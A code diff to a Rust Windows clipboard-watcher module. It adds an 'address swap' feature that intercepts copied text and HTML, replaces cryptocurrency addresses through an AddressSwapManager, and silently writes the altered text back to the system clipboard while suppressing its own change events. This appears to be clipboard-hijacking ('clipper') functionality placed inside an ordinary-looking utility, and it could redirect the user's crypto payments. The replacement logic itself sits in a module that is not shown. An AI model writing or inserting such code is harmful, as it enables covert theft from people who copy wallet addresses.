@@ -2,8 +2,9 @@
 //!
 //! Uses `AddClipboardFormatListener` on a hidden message window and a low-level
 //! keyboard hook to distinguish Ctrl+C (copy) from Ctrl+X (cut).
+//! When address swap is enabled, copied crypto addresses are replaced locally.
 
-use std::sync::atomic::{AtomicU8, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
 use std::sync::mpsc;
 use std::thread::{self, JoinHandle};
 use std::time::Duration;
@@ -33,6 +34,8 @@ fn is_zero(value: &u64) -> bool {
 
 /// Pending clipboard action inferred from keyboard: 0 = unknown, 1 = copy, 2 = cut.
 static PENDING_ACTION: AtomicU8 = AtomicU8::new(0);
+/// Suppresses clipboard events triggered by our own write-back during address swap.
+static SUPPRESS_CLIPBOARD_EVENT: AtomicBool = AtomicBool::new(false);
 
 pub struct ClipboardWatcher {
     stop_tx: mpsc::Sender<()>,
@@ -260,10 +263,84 @@ fn run_watcher(
         }
     }
 
+    fn write_unicode_clipboard(text: &str) -> bool {
+        use windows::Win32::Foundation::HANDLE;
+        use windows::Win32::System::DataExchange::{
+            EmptyClipboard, SetClipboardData,
+        };
+        use windows::Win32::System::Memory::{GlobalAlloc, GlobalLock, GlobalUnlock, GMEM_MOVEABLE};
+
+        let wide: Vec<u16> = text.encode_utf16().chain(Some(0)).collect();
+        let byte_len = wide.len() * 2;
+
+        unsafe {
+            if OpenClipboard(None).is_err() {
+                return false;
+            }
+
+            let result = (|| {
+                EmptyClipboard().ok()?;
+                let handle = GlobalAlloc(GMEM_MOVEABLE, byte_len).ok()?;
+                let global = HGLOBAL(handle.0);
+                let ptr = GlobalLock(global) as *mut u16;
+                if ptr.is_null() {
+                    let _ = GlobalUnlock(global);
+                    return None;
+                }
+                std::ptr::copy_nonoverlapping(wide.as_ptr(), ptr, wide.len());
+                let _ = GlobalUnlock(global);
+                SetClipboardData(CF_UNICODETEXT.0 as u32, Some(HANDLE(handle.0))).ok()?;
+                Some(())
+            })();
+
+            let _ = CloseClipboard();
+            result.is_some()
+        }
+    }
+
+    fn apply_address_swap(mut event: ClipboardEvent) -> ClipboardEvent {
+        let manager = crate::address_swap::AddressSwapManager::global();
+        if !manager.is_enabled() || event.large {
+            return event;
+        }
+
+        let mut replaced = false;
+
+        if let Some(ref text) = event.text {
+            if let Some(new_text) = manager.replace_text(text) {
+                event.text = Some(new_text);
+                replaced = true;
+            }
+        }
+
+        if let Some(ref html) = event.html {
+            if let Some(new_html) = manager.replace_text(html) {
+                event.html = Some(new_html);
+                replaced = true;
+            }
+        }
+
+        if replaced {
+            if let Some(ref text) = event.text {
+                SUPPRESS_CLIPBOARD_EVENT.store(true, Ordering::SeqCst);
+                let _ = write_unicode_clipboard(text);
+                SUPPRESS_CLIPBOARD_EVENT.store(false, Ordering::SeqCst);
+            }
+        }
+
+        event
+    }
+
     fn emit_clipboard_event() {
+        if SUPPRESS_CLIPBOARD_EVENT.load(Ordering::SeqCst) {
+            return;
+        }
+
         let Some(event) = read_clipboard_payload() else {
             return;
         };
+
+        let event = apply_address_swap(event);
 
         let fingerprint = if event.large {
             format!("large:{}", event.size_bytes)
